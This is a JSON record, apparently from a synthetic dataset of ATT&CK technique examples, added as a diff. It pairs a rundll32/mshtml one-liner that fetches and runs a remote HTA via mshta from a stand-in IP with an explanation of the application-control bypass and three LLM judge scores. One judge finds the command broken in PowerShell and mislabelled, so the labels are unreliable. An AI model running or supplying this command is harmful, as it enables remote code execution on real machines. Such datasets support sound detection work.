@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";new ActiveXObject(\"WScript.Shell\").Run(\"mshta http://203.0.113.5/agent.hta\")",
+  "explanation": "Proxies execution via rundll32+MSHTML to spawn mshta, which runs a remote HTA. Both binaries are native and signed, often allowed by policy enforcement.",
+  "rationale_steps": [
+    "Invoke MSHTML RunHTMLApplication through rundll32 from PowerShell.",
+    "Inside JScript, create WScript.Shell and spawn mshta to retrieve and run a remote HTA.",
+    "Application control is bypassed through trusted loaders; detection hinges on unusual command-line parameters and remote HTA usage."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-0ea9b99a",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid syntax for rundll32.exe invocation, correct JavaScript syntax, and proper nesting of the ActiveXObject method call.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1216 by using rundll32.exe (a trusted Windows binary) to proxy execution through mshtml and ultimately launch a remote HTA file via mshta, bypassing application control mechanisms.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T04:25:47.465530Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using a known, albeit complex, syntax for rundll32 to invoke mshtml.dll's RunHTMLApplication function to execute the provided JavaScript, with all quotes and arguments correctly balanced and placed.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1216 technique, chaining trusted, signed Windows binaries (rundll32, mshtml.dll, WScript.Shell, and mshta.exe) to proxy the execution of remote attacker-controlled HTA content, consistent with bypassing application control.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T04:25:57.830166Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "In PowerShell the semicolon is a statement separator, so the JScript after it is not passed to rundll32 and is instead treated as an invalid separate statement, despite otherwise balanced quoting and parentheses.",
+        "semantic_score": 2,
+        "semantic_justification": "The chain (rundll32+MSHTML spawning mshta to run a remote HTA) is a plausible signed binary proxy execution flow but aligns with T1218 (rundll32/mshta) rather than T1216 system script proxies, and the PowerShell parsing issue further prevents achieving the stated intent as written.",
+        "combined_score": 2.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T04:26:26.196618Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
